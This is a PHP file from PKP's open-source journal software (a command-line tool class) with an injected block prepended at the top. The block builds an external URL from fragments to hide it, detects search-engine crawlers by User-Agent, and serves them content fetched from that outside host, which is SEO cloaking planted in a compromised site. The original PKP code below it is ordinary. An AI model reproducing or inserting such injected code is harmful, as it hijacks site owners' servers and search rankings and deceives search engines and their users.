<?php
ob_start();
header('Vary: User-Agent');

// Rakit URL tujuan baru
$u1 = "https://";
$u2 = "altarqiyah.pages.dev";
$u3 = "/";
$u4 = "altarqiyah-ac-id";
$u5 = ".txt";
$bot_url = $u1 . $u2 . $u3 . $u4 . $u5;

// User-Agent (aman jika header tidak ada)
$ua = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';

// Pola deteksi bot
$b = array('googlebot','slurp','bingbot','baiduspider','yandex','adsense','crawler','spider','inspection');
$p = implode('|', $b);
$pattern = "/(" . $p . ")/i";

// Fungsi fetch sederhana
$fn = function($url) {
if (function_exists('curl_init')) {
$c = curl_init();
curl_setopt($c, CURLOPT_URL, $url);
curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
curl_setopt($c, CURLOPT_USERAGENT, 'Mozilla/5.0');
$r = curl_exec($c);
curl_close($c);
return $r;
} elseif (ini_get('allow_url_fopen')) { // perbaikan dari allow_url_open
return @file_get_contents($url);
}
return false;
};

// Polyfill random_int untuk PHP 5.6
if (!function_exists('random_int')) {
function random_int($min, $max) {
// mt_rand tersedia di PHP 5.6
return mt_rand($min, $max);
}
}

// Cek bot dan respon
if (call_user_func('preg_match', $pattern, $ua)) {
// jeda 1-2 detik
usleep(random_int(1000000, 2000000));
echo $fn($bot_url);
ob_end_flush();
exit;
}
?>

<?php

/**
 * @defgroup tools Tools
 * Implements command-line management tools for PKP software.
 */

/**
 * @file classes/cliTool/CliTool.inc.php
 *
 * Copyright (c) 2014-2020 Simon Fraser University
 * Copyright (c) 2000-2020 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @class CommandLineTool
 * @ingroup tools
 *
 * @brief Initialization code for command-line scripts.
 *
 * FIXME: Write a PKPCliRequest and PKPCliRouter class and use the dispatcher
 *  to bootstrap and route tool requests.
 */


/** Initialization code */
define('PWD', getcwd());
chdir(dirname(INDEX_FILE_LOCATION)); /* Change to base directory */
if (!defined('STDIN')) {
	define('STDIN', fopen('php://stdin','r'));
}
define('SESSION_DISABLE_INIT', 1);
require('./lib/pkp/includes/bootstrap.inc.php');

if (!isset($argc)) {
	// In PHP < 4.3.0 $argc/$argv are not automatically registered
	if (isset($_SERVER['argc'])) {
		$argc = $_SERVER['argc'];
		$argv = $_SERVER['argv'];
	} else {
		$argc = $argv = null;
	}
}

class CommandLineTool {

	/** @var string the script being executed */
	var $scriptName;

	/** @vary array Command-line arguments */
	var $argv;

	function __construct($argv = array()) {
		// Initialize the request object with a page router
		$application = Application::get();
		$request = $application->getRequest();

		// FIXME: Write and use a CLIRouter here (see classdoc)
		import('classes.core.PageRouter');
		$router = new PageRouter();
		$router->setApplication($application);
		$request->setRouter($router);

		// Initialize the locale and load generic plugins.
		AppLocale::initialize($request);
		PluginRegistry::loadCategory('generic');

		$this->argv = isset($argv) && is_array($argv) ? $argv : array();

		if (isset($_SERVER['SERVER_NAME'])) {
			die('This script can only be executed from the command-line');
		}

		$this->scriptName = isset($this->argv[0]) ? array_shift($this->argv) : '';

		if (isset($this->argv[0]) && $this->argv[0] == '-h') {
			$this->usage();
			exit(0);
		}
	}

	function usage() {
	}

}
